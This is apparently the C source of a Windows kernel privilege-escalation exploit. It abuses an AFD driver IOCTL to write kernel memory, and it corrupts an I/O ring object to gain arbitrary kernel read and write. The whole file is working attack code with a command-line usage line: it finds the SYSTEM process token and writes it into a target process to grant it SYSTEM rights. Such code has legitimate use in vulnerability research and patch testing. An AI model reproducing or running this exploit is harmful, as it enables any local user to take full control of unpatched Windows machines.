#include "exp.h"

NTSTATUS WriteData(PVOID addr, DWORD data) {
    NTSTATUS status = 0;
    struct AFD_NOTIFYSOCK_STRUCT inbuf1 = { 0 };

    inbuf1.Handle = CreateIoCompletionPort(INVALID_HANDLE_VALUE, NULL, 0, 0);
    inbuf1.Length1 = 0x1;
    inbuf1.List1 = malloc(0x1000);
    inbuf1.Length2 = data;
    inbuf1.List2 = malloc(0x20 * (inbuf1.Length2));
    inbuf1.CONTROLDATA = (ULONGLONG)addr;
    inbuf1.DATA3 = 0x4141414141414141;

    if (inbuf1.Handle) {
        for (int i = 0; i < inbuf1.Length2; i++) {
            status = PostQueuedCompletionStatus(inbuf1.Handle, 0, 0, NULL);
            if (status == 0) {
                printf("[%d]Error when queued completion status\n", i);
                return S_FALSE;
            }
        }
    }
    else {
        printf("Error when create I/O completion port\n");
        return S_FALSE;
    }

    WSADATA WSAData;
    SOCKET s;
    sockaddr_in sa;
    int ierr;
    WSAStartup(0x2, &WSAData);
    s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    memset(&sa, 0, sizeof(sa));
    sa.sin_port = htons(135);
    sa.sin_addr.S_un.S_addr = inet_addr("127.0.0.1");
    sa.sin_family = AF_INET;
    ierr = connect(s, (const struct sockaddr*)&sa, sizeof(sa));

    DeviceIoControl((HANDLE)s, 0X12127, (LPVOID)&inbuf1, sizeof(inbuf1), NULL, 0, NULL, NULL);
    return S_OK;
}

NTSTATUS GetObjAddress(HANDLE h, ULONG pid, PULONGLONG pObjAddr) {
    NTSTATUS status = STATUS_SUCCESS;
    ULONG bufferSize = 0;
    PVOID buffer = NULL;
    PSYSTEM_HANDLE_INFORMATION handleInfo = NULL;
    ULONG i;

    while ((status = _NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)16, handleInfo, bufferSize, &bufferSize)) == STATUS_INFO_LENGTH_MISMATCH)
    {
        if (handleInfo != NULL)
        {
            handleInfo = (PSYSTEM_HANDLE_INFORMATION)HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, handleInfo, 2 * bufferSize);
        }

        else
        {
            handleInfo = (PSYSTEM_HANDLE_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 2 * bufferSize);
        }
    }

    if (status == STATUS_SUCCESS)
    {
        status = STATUS_NOT_FOUND;
        //handleInfo = (PSYSTEM_HANDLE_INFORMATION)buffer;
        for (i = 0; i < handleInfo->HandleCount; i++)
        {
            //printf("%d\n", i);
            HANDLE handle = (HANDLE)handleInfo->Handles[i].Handle;
            ULONG processId = handleInfo->Handles[i].ProcessId;
            // use handle and processId to perform malicious actions
            if (processId == pid && handle == h) {
                *pObjAddr = (ULONGLONG)handleInfo->Handles[i].Object;
                status = STATUS_SUCCESS;
                break;
            }
        }
    }

    if (NULL != handleInfo)
    {
        HeapFree(GetProcessHeap, 0, handleInfo);
    }

    return status;

}

NTSTATUS ArbitraryWrite(HIORING ioring, PULONGLONG pBuffer, HANDLE hPipeServer, HANDLE hPipeClient, PVOID writeDst, PVOID writeBuffer, DWORD len) {
    IORING_CQE cqe = { 0 };
    HRESULT status = S_OK;
    PIOP_MC_BUFFER_ENTRY pMcBufferEntry = NULL;

    // 先将内容写入管道
    status = WriteFile(hPipeServer, writeBuffer, len, NULL, NULL);
    if (status == 0) {
        printf("[x] Error when write file\n");
        status =  S_FALSE;
        goto clear;
    }

    // 重新设置假缓冲区中保存的相关字段信息
    pMcBufferEntry = (PIOP_MC_BUFFER_ENTRY)VirtualAlloc(NULL, sizeof(IOP_MC_BUFFER_ENTRY), MEM_COMMIT, PAGE_READWRITE);
    pMcBufferEntry->Address = writeDst;
    pMcBufferEntry->Length = len;
    pMcBufferEntry->Type = 0xc02;
    pMcBufferEntry->Size = 0x80; // 0x20 * (numberOfPagesInBuffer + 3)
    pMcBufferEntry->AccessMode = 1;
    pMcBufferEntry->ReferenceCount = 1;
    pBuffer[0] = (ULONGLONG)pMcBufferEntry;


    // 再调用 BuildIoRingReadFile 将管道的内容读取到假缓冲区
    status = BuildIoRingReadFile(ioring, IoRingHandleRefFromHandle(hPipeClient), IoRingBufferRefFromIndexAndOffset(0, 0), len, 0, NULL, IOSQE_FLAGS_NONE);
    if (status != S_OK) {
        printf("[x] Error when read file with ioring\n");
        status = S_FALSE;
        goto clear;
    }

    status = SubmitIoRing(ioring, 0, 0, NULL);
    if (status != S_OK) {
        printf("[x] Error when submit ioring\n");
        status = S_FALSE;
        goto clear;
    }

    status = PopIoRingCompletion(ioring, &cqe);
    if (status != S_OK) {
        printf("[x] Error when pop ioring\n");
        status = S_FALSE;
        goto clear;
    }

    if (cqe.ResultCode != S_OK) {
        printf("[x] IORing read operation failed\n");
        status = S_FALSE;
        goto clear;;
    }

clear:
    if (NULL != pMcBufferEntry)
    {
        VirtualFree(pMcBufferEntry, sizeof(IOP_MC_BUFFER_ENTRY), MEM_RELEASE);
    }
    return status;

}

NTSTATUS ArbitraryRead(HIORING ioring, PULONGLONG pBuffer, HANDLE hPipeServer, HANDLE hPipeClient, PVOID readSrc, PVOID readBuffer, DWORD len) {
    IORING_CQE cqe = { 0 };
    HRESULT status = S_OK;
    PIOP_MC_BUFFER_ENTRY pMcBufferEntry = NULL;

    // 重新设置假缓冲区中保存的相关字段信息
    pMcBufferEntry = (PIOP_MC_BUFFER_ENTRY)VirtualAlloc(NULL, sizeof(IOP_MC_BUFFER_ENTRY), MEM_COMMIT, PAGE_READWRITE);
    pMcBufferEntry->Address = readSrc;
    pMcBufferEntry->Length = len;
    pMcBufferEntry->Type = 0xc02;
    pMcBufferEntry->Size = 0x80; // 0x20 * (numberOfPagesInBuffer + 3)
    pMcBufferEntry->AccessMode = 1;
    pMcBufferEntry->ReferenceCount = 1;
    pBuffer[0] = (ULONGLONG)pMcBufferEntry;


    // 再调用 BuildIoRingReadFile 将管道的内容读取到假缓冲区
    status = BuildIoRingWriteFile(ioring, IoRingHandleRefFromHandle(hPipeClient), IoRingBufferRefFromIndexAndOffset(0, 0), len, 0, FILE_WRITE_FLAGS_NONE, NULL, IOSQE_FLAGS_NONE);
    if (status != S_OK) {
        printf("[x] Error when write file with ioring\n");
        status = S_FALSE;
        goto clear;
    }

    status = SubmitIoRing(ioring, 0, 0, NULL);
    if (status != S_OK) {
        printf("[x] Error when submit ioring\n");
        status = S_FALSE;
        goto clear;
    }

    status = PopIoRingCompletion(ioring, &cqe);
    if (status != S_OK) {
        printf("[x] Error when pop ioring\n");
        status = S_FALSE;
        goto clear;
    }

    if (cqe.ResultCode != S_OK) {
        printf("[x] IORing write operation failed\n");
        status = S_FALSE;
        goto clear;;
    }

    // 最后从管道中读取数据
    status = ReadFile(hPipeServer, readBuffer, len, NULL, NULL);
    if (status == 0) {
        printf("[x] Error when read file\n");
        status = S_FALSE;
        goto clear;
    }
    status = STATUS_SUCCESS;

clear:
    if (NULL != pMcBufferEntry)
    {
        VirtualFree(pMcBufferEntry, sizeof(IOP_MC_BUFFER_ENTRY), MEM_RELEASE);
    }
    return status;

}

/*
流程：
1. CreateIoRing 创建 ioring  
2. 为 RegBuffers 分配空间，地址设置为 0x1000000
2. 触发漏洞设置 RegBuffers 和 RegCount
3. 调用 BuildIoRingReadFile 或者 BuildIoRingWriteFile 实现任意内核地址读写
*/
VOID EoP(int pid) {
    int status = 0;
    IORING_CREATE_FLAGS flag;
    HIORING hIORING;
    _HIORING* phIORING;
    PIORING_OBJECT pIORING = NULL;
    PVOID buffer;
    ULONGLONG systemTokenAddr, procTokenAddr, systemToken = 0;
    HANDLE hProc;
    ULONGLONG address = 0x1000000;
    DWORD count = 1;
    HANDLE writePipeServer, writePipeClient, readPipeServer, readPipeClient;

    // 创建管道
    writePipeServer = CreateNamedPipe(WRITE_PIPE_NAME, PIPE_ACCESS_DUPLEX, PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, 0x1000, 0x1000, 0, NULL);
    if (writePipeServer == INVALID_HANDLE_VALUE) {
        printf("[x] Error when create input pipe\n");
        exit(1);
    }

    writePipeClient = CreateFile(WRITE_PIPE_NAME, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (writePipeClient == INVALID_HANDLE_VALUE) {
        printf("[x] Error when connect to input pipe\n");
        exit(1);
    }

    readPipeServer = CreateNamedPipe(READ_PIPE_NAME, PIPE_ACCESS_DUPLEX, PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, 0x1000, 0x1000, 0, NULL);
    if (readPipeServer == INVALID_HANDLE_VALUE) {
        printf("[x] Error when create output pipe\n");
        exit(1);
    }

    readPipeClient = CreateFile(READ_PIPE_NAME, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (readPipeClient == INVALID_HANDLE_VALUE) {
        printf("[x] Error when connect to output pipe\n");
        exit(1);
    }
    
    // 创建 IORING
    flag.Advisory = IORING_CREATE_ADVISORY_FLAGS_NONE;
    flag.Required = IORING_CREATE_REQUIRED_FLAGS_NONE;
    status = CreateIoRing(IORING_VERSION_3, flag, 0x10000, 0x20000, &hIORING);
    if (status != S_OK) {
        printf("[x] Error when creating ioring\n");
        exit(1);
    }

    // 创建假缓冲区
    buffer = VirtualAlloc((LPVOID)address, sizeof(PVOID) * count, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (buffer == NULL) {
        printf("[x] Error when alloc buffer\n");
        exit(1);
    }
    
    // 找到 HIORING 对应的 IORING_OBJECT 地址
    status = GetObjAddress(*(PHANDLE)hIORING, GetCurrentProcessId(), (PULONGLONG)&pIORING);
    if (status != S_OK) {
        printf("[x] Error when get ioring object address: %llx\n", status);
        exit(1);
    }
    printf("[+] IORING_OBJECT address is 0x%llx\n", pIORING);

    // 利用漏洞修改 IORING_OBJECT 中的字段
    status = WriteData(&(pIORING->RegBuffersCount), count);
    if (status != S_OK) {
        printf("[x] Error when read system token\n");
        goto cleanup;
    }
    printf("[+] Change RegBuffersCount in IORING_OBJECT done\n");
    status = WriteData((char*)&(pIORING->RegBuffers)+0x3, 1);
    if (status != S_OK) {
        printf("[x] Error when read system token\n");
        goto cleanup;
    }
    printf("[+] Change RegBuffers in IORING_OBJECT done\n");
    // 同时修改 HIORING 中的字段
    phIORING = (_HIORING*)hIORING;
    phIORING->RegBufferArray = buffer;
    phIORING->BufferArraySize = count;
    printf("[+] Change field in HIORING done\n");

    // 获取系统进程 TOKEN 地址
    status = GetObjAddress((HANDLE)4, 4, &systemTokenAddr);
    if (status != STATUS_SUCCESS) {
        printf("Error get system token address\n");
        goto cleanup;
    }
    printf("[+] System process EPROC address is 0x%llx, token address is 0x%llx\n", systemTokenAddr, systemTokenAddr + EPROC_TOKEN_OFFSET);
    systemTokenAddr += EPROC_TOKEN_OFFSET;
    // 获取目标进程 TOKEN 地址
    hProc = OpenProcess(PROCESS_QUERY_INFORMATION, 0, pid);
    status = GetObjAddress(hProc, GetCurrentProcessId(), &procTokenAddr);
    if (status != STATUS_SUCCESS) {
        printf("[x] Error get target process token address\n");
        goto cleanup;
    }
    printf("[+] Target process EPROC address is 0x%llx, token address is 0x%llx\n", procTokenAddr, procTokenAddr+ EPROC_TOKEN_OFFSET);
    procTokenAddr += EPROC_TOKEN_OFFSET;
    // 获取系统进程 TOKEN 值
    status = ArbitraryRead(hIORING, (PULONGLONG)buffer, readPipeServer, readPipeClient, (PVOID)systemTokenAddr, &systemToken, sizeof(ULONGLONG));
    if (status != S_OK) {
        printf("[x] Error when read system token\n");
        goto cleanup;
    }

    // 清除 _EX_FAST_REF RefCnt
    printf("[+] SystemToken is 0x%llx\n", systemToken);
    systemToken &= 0xfffffffffffffff0;
    printf("[+] SystemToken after clear out is 0x%llx\n", systemToken);

    // 写入目标进程 TOKEN
    status = ArbitraryWrite(hIORING, (PULONGLONG)buffer, writePipeServer, writePipeClient, (PVOID)procTokenAddr, &systemToken, sizeof(ULONGLONG));
    if (status != S_OK) {
        printf("[x] Errpr when write target process token\n");
        goto cleanup;
    }

    printf("[+] Exploit done!\n");

cleanup:
    if (pIORING) {
        byte clean = 0;
        //WriteData((char*)&(pIORING->RegBuffers) + 0x3, 0);
        ArbitraryWrite(hIORING, (PULONGLONG)buffer, writePipeServer, writePipeClient, (char*)&(pIORING->RegBuffers) + 0x3, &clean, 1);
        printf("[+] Clean RegBuffers in IORING_OBJECT done\n");
    }
    if (hIORING) {
        phIORING = (_HIORING*)hIORING;
        phIORING->RegBufferArray = 0;
        printf("[+] Clean field in HIORING done\n");
        CloseIoRing(hIORING);
    }
    
    
}



int main(int argc, char* argv[])
{
    //IORING_CAPABILITIES capabilities;
    //QueryIoRingCapabilities(&capabilities);
    //printf("MaxVersion is %d", capabilities.MaxVersion);
    _NtQuerySystemInformation = (unsigned long(__stdcall*)(SYSTEM_INFORMATION_CLASS, PVOID, ULONG, PULONG))GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");


    ULONG pid = 0;

    if (argc != 2)
    {
        printf("[!] Usage: exp.exe <pid>\n");
        return 1;
    }

    pid = strtol(argv[1], NULL, 10);
    EoP(pid);
    return 0;
}